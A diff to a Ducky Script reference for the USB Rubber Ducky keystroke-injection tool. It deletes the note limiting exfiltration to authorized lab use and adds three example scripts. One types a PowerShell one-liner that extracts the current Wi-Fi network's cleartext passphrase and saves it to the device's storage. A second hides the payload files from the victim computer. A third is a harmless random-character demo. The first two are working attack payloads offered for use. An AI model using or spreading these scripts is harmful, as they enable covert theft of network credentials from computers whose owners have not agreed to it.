@@ -281,7 +281,7 @@ $_ JITTER_ENABLED / $_ JITTER_MAX
 Enables keystroke timing variance and sets the maximum per-keystroke jitter (ms), based on the device seed value.  
   
   
-## Payload Hiding (MicroSD)  
+## Payload Hiding  
   
 HIDE_PAYLOAD  
 Hides payload files (e.g., `inject.bin`, `seed.bin`) from the MicroSD before enabling storage mode. Typically used while in `OFF` or `HID`.  
@@ -308,13 +308,96 @@ RESTORE_HOST_KEYBOARD_LOCK_STATE
 Restores the saved lock key states so you don’t leave the user’s keyboard toggles changed.  
   
   
-## Exfiltration (High-Level)  
+## Exfiltration  
   
 EXFIL  
-Writes variable data to a loot file on the device (for authorized lab/testing use). This is local capture, not a network transfer.  
+Writes variable data to a loot file on the device. This is local capture, not a network transfer.  
   
 Keystroke Reflection  
 Uses lock key state changes as a signaling channel to store data back to the device (saved to `loot.bin`), where supported/configured.
 
 Variable Exfiltration
 Similarly, arbitrary variable data may be saved to the `loot.bin` file using the `EXFIL` command.
+
+## Examples of Ducky Scripts
+Here are 3 examples of a Ducky Script that can be used.
+
+1. Network Exfiltration
+```
+REM Example Simple USB Exfiltration Technique for Windows
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\'$env:computername'.txt'"
+ENTER
+
+
+REM This short Powershell one-liner executes from the Windows Run dialog.
+REM The drive letter of the volume with the label “DUCKY” is saved as $m.
+REM The netsh command will get the network name and passphrase for the currently connected network ((Get-NetConnectionProfile).Name).
+REM The results of the netsh command (filtered for only SSID and key) will be redirected (saved) to a file on the root of the “DUCKY” drive, saved as the computer name (in .txt format).
+```
+
+2. Payload Hiding
+```
+ATTACKMODE OFF
+
+BUTTON_DEF
+    ATTACKMODE OFF
+    RESTORE_PAYLOAD
+    ATTACKMODE STORAGE
+END_BUTTON
+
+HIDE_PAYLOAD
+ATTACKMODE HID STORAGE
+DELAY 2000
+STRING Nothing to see here...
+
+
+REM Upon first enumeration, the attached computer will not be able to see the inject.bin or seed.bin files on the USB Rubber Ducky storage.
+REM Pressing the button will re-enumerate the USB Rubber Ducky storage with both files visible once more.
+```
+
+3. Randomization
+```
+REM Example Random Keys
+ATTACKMODE HID STORAGE
+DELAY 2000
+
+BUTTON_DEF
+    RANDOM_CHARACTER
+END_BUTTON
+
+STRINGLN Here are 10 random lowercase letters:
+VAR $TIMES = 10
+WHILE ($TIMES > 0)
+    RANDOM_LOWERCASE_LETTER
+    $TIMES = ($TIMES - 1)
+END_WHILE
+ENTER
+ENTER
+STRINGLN Here are 20 random numbers:
+VAR $TIMES = 20
+WHILE ($TIMES > 0)
+    RANDOM_NUMBER
+    $TIMES = ($TIMES - 1)
+END_WHILE
+ENTER
+ENTER
+STRINGLN Here are 3 random special characters:
+RANDOM_SPECIAL
+RANDOM_SPECIAL
+RANDOM_SPECIAL
+STRINGLN Press the button for a random character:
+
+
+
+REM This payload will type:
+REM 10 random lowercase letters, per the while loop.
+REM 20 random numbers, per the while loop.
+REM 3 random special characters.
+REM The payload will then instruct the user to press the button.
+REM On each press of the button, the BUTTON_DEF will execute. 
+REM This special functions contains the RANDOM_CHARACTER command, and thus a random character will be typed.
+```
